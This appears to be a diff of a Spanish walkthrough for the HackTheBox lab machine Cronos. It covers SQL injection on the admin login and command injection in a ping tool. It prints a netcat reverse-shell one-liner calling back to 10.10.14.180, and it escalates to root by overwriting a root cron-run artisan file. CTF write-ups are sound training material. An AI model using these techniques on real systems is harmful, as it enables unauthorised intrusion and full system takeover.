@@ -15,13 +15,13 @@ nslookup 10.129.23.8 10.129.23.8
 8.23.129.10.in-addr.arpa        name = ns1.cronos.htb.
 ```
 
-Añadir el nuevo subdominio al fichero hosts
+Añadir el nuevo subdominio al fichero hosts para que nuestra máquina lo resuelva
 ```
 nano /etc/hosts
 cronos.htb
 ```
 
-Hacemos fuerza bruta para buscar posibles vulnerabilidades y lo que encontramos no nos sirve
+Hacemos fuerza bruta para buscar posibles vulnerabilidades y lo que encontramos a simple vista no parece ser un vector de ataque
 ```bash
 gobuster dir --url http://cronos.htb/ --wordlist /usr/share/wordlists/DirectoryDiscovery/common.txt
 
@@ -66,7 +66,7 @@ nano /etc/hosts
 
 ### Primera vulnerabilidad--SQLi
 
-En la página encontramos que el login es vulnerable a SQLi
+En la página de admin.cronos.htb encontramos que el login es vulnerable a SQLi poniendo '-- - ya que ignora la entrada de la contraseña
 
 ![Login.png](/img/Login.png)
 Después de ese login entraremos a una herramienta web para la red con opción de traceroute y ping
@@ -77,11 +77,11 @@ Después de ese login entraremos a una herramienta web para la red con opción d
 Descubrí que tiene una vulnerabilidad y se le puede inyectar código usando el ; ya que cumple como si fuese una terminal
 ![Vulnerabilidad1.png](/img/Vulnerabilidad1.png)
 
-Aprovecharemos esto usando burpsuite para cambiar el comando y abrir una shell en nuestro equipo.
+Aprovecharemos esto usando burpsuite recibiendo la petición para cambiar el comando y abrir una shell en nuestro equipo.
 
 ![Burpsuite1.png](/img/Burpsuite1.png)
 
-Usamos el siguiente comando que nos permitirá hacer una escucha para obtener la reverse shell, recordad encodear los símbolos en URL para que funcione.
+Usamos el siguiente comando que nos permitirá hacer una escucha para obtener la reverse shell y tener acceso al sistema, recordad encodear los símbolos en URL para que funcione.
 ```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/ -i 2>&1|nc 10.10.14.180 1234 >/tmp/f
 ```
@@ -95,8 +95,7 @@ En mi caso he usado penelope para obtener la shell full interactiva, ya tenemos 
 
 ![UserTXT.png](/img/UserTXT.png)
 
-Me crearé un servidor web para descargar en la máquina victima linpeas y proceder a enumerar.
-En la enumeración vemos algo muy interesante en los cronjobs y es que el fichero /var/www/laravel/artisan en el cual tenemos todos los permisos
+Me crearé un servidor web para descargar en la máquina victima linpeas y proceder a enumerar el sistema. En la enumeración vemos algo muy interesante en los cronjobs y es que el fichero /var/www/laravel/artisan tenemos todos los permisos 
 
 ![EscaladaPrivs.png](/img/EscaladaPrivs.png) 
 ```bash
@@ -105,10 +104,10 @@ www-data@cronos:/tmp$ ls -la /var/www/laravel/artisan
 ```
 
 ### Escalada de privilegios
-Para la escalada de privilegios cambiaremos el fichero php por una reverse shell que nos ejecutará el cron como root y tendremos acceso privilegiado al sistema.
+Para la escalada de privilegios cambiaremos el fichero php artisan por una reverse shell que nos ejecutará el cron como root y tendremos acceso privilegiado al sistema.
 
 ![EscaladaPrivs1.png](/img/EscaladaPrivs1.png)
 
-Ahora debemos poner en escucha a través del puerto que hemos puesto en la reverse shell y esperaremos, después de unos segundos seremos root y habremos completado la máquina con la úl
+Ahora debemos poner en escucha a través del puerto que hemos puesto en la reverse shell y esperaremos, después de unos segundos seremos root y habremos completado la máquina con la última flag
 
 ![RootTXT.png](/img/RootTXT.png)
